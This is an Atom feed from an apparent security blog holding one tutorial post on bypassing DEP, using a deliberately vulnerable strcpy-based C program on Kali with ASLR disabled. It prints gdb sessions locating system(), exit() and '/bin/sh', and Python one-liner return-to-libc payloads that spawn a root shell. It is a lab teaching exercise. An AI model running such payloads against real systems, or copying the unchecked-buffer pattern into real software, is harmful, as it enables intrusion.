<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Exploitation for beginners]]></title>
  <link href="http://shashikiranp13.github.io/atom.xml" rel="self"/>
  <link href="http://shashikiranp13.github.io/"/>
  <updated>2017-06-07T22:50:15+05:30</updated>
  <id>http://shashikiranp13.github.io/</id>
  <author>
    <name><![CDATA[Shashikiran]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Bypass DEP Using ROP]]></title>
    <link href="http://shashikiranp13.github.io/blog/2017/06/07/dep-bypass/"/>
    <updated>2017-06-07T20:22:47+05:30</updated>
    <id>http://shashikiranp13.github.io/blog/2017/06/07/dep-bypass</id>
    <content type="html"><![CDATA[<p>ROP- Return Oriented Programming</p>

<p>Using the existing instructions present in the memory and making them execute is the concept behind ROP.</p>

<p>We need to form the chain of those instructions to jump from one set of instructions to others.
Each instruction (series of instructions) in our ROP chain will be called a &ldquo;gadget&rdquo;. Each gadget will return to the next gadget (to the address of the next gadget, placed on the stack), or will call the next address directly.</p>

<!--more-->


<h3>Environment</h3>

<ul>
<li>OS: Kali linux 2</li>
<li>Disable ASLR on the linux</li>
</ul>


<p><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>

<h2>Sample C program</h2>

<p>Simple C program with buffer overflow</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>void vuln(char *s)
</span><span class='line'>{
</span><span class='line'>    char buffer[10];
</span><span class='line'>    strcpy(buffer, s);     // overflow will happen here
</span><span class='line'>  printf("value is %s",buffer);
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>    if (argc == 1) {
</span><span class='line'>        fprintf(stderr, "Enter a string!\n");
</span><span class='line'>        exit(EXIT_FAILURE);
</span><span class='line'>    }
</span><span class='line'>    vuln(argv[1]);
</span><span class='line'>  return 0;
</span><span class='line'>}
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>


<p>The above program results in segmentation fault when you supply large input.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop/BOF/BOF_NX# ./basic_bof AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>After finding the offset where the EIP can be controlled.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$edb --run ./basic_bof $(python -c 'print ("A"*22+"B"*4)')
</span></code></pre></td></tr></table></div></figure>


<p>The EIP offset is at 22.</p>

<p><img src="http://shashikiranp13.github.io/images/DEP/1.png" alt="crash-debug" /></p>

<h2>Why DEP is preventing exploitation?</h2>

<p>We will try to execute the code present in the stack and see how the application behaves.</p>

<p>Finding the JMP ESP address</p>

<p><img src="http://shashikiranp13.github.io/images/DEP/2.png" alt="jmp-esp" /></p>

<p>Address of jmp esp is b7e06aa9</p>

<p><img src="http://shashikiranp13.github.io/images/DEP/3.png" alt="jmp-esp-3" /></p>

<p>press  F7 twice and you will see that the application crashes when trying to execute the instruction from the stack.</p>

<p><img src="http://shashikiranp13.github.io/images/DEP/4.png" alt="illegal-excep" /></p>

<h2>Using the ROP technique:</h2>

<hr />

<p>We will be using the system function call present in the libc and pass it the argument /bin/sh so that we will get the shell.</p>

<p>Finding the address of the system function call</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop/BOF/BOF_NX# gdb ./basic_bof
</span><span class='line'>(gdb) break main
</span><span class='line'>Breakpoint 1 at 0x80484e8
</span><span class='line'>(gdb) run
</span><span class='line'>Starting program: /root/Desktop/BOF/BOF_NX/basic_bof 
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484e8 in main ()
</span><span class='line'>(gdb) print system
</span><span class='line'>$1 = {&lt;text variable, no debug info&gt;} 0xb7e3e850 &lt;__libc_system&gt;
</span><span class='line'>(gdb) 
</span><span class='line'>(gdb) find &system, +99999999, "/bin/sh"
</span><span class='line'>0xb7f5ce64  
</span><span class='line'>warning: Unable to access 16000 bytes of target memory at 0xb7fb6bec, halting search.
</span><span class='line'>1 pattern found.
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>


<p>address of system() is 0xb7e3e850
address of /bin/sh 0xb7f5ce64</p>

<p>Whenever a function is called the called function parametrs and the return address are stored in the stack.
So we will modify the stack as
Point EIP to system function call, when system is called its return address and parameters needs to be stored in the stack.
See second stack layout in below figure.</p>

<p><img src="http://shashikiranp13.github.io/images/DEP/5.png" alt="stack-layout" /></p>

<p>so we will craft the payload as below.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$edb --run ./basic_bof $(python -c 'print ("A"*22+"\x50\xe8\xe3\xb7"+"\x90"*4+"\x64\xce\xf5\xb7")')
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://shashikiranp13.github.io/images/DEP/6.png" alt="jmp-sys" /></p>

<p>If you see the stack layout we can notice that the return address(when system function call completes execution it will jump to this address) and parameter(address of /bin/sh) for the system call.
Run the program and exit the debugger and we can receive the shell.</p>

<p><img src="http://shashikiranp13.github.io/images/DEP/7.png" alt="shell" /></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop/BOF/BOF_NX# ./basic_bof $(python -c 'print ("A"*22+"\x50\xe8\xe3\xb7"+"\x90"*4+"\x64\xce\xf5\xb7")')
</span><span class='line'># id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'># exit
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>The segmentaion fault occurs because we filled the return address of the system with nops.
The nops in the above payload is return address when system finishes execution.
We can set the return address to address of exit function and exit doesnâ€™t need any parameters to be passed.</p>

<p>Finding the address of the exit and replacing</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) print exit
</span><span class='line'>$3 = {&lt;text variable, no debug info&gt;} 0xb7e326c0 &lt;__GI_exit&gt;
</span><span class='line'>
</span><span class='line'>root@kali:~/Desktop/BOF/BOF_NX# ./basic_bof $(python -c 'print "A"*22+"\x50\xe8\xe3\xb7"+"\xc0\x26\xe3\xb7"+"\x64\xce\xf5\xb7"')
</span><span class='line'># id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'># exit
</span><span class='line'>value is AAAAAAAAAAAAAAAAAAAAAAP____&__d___r
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
</feed>
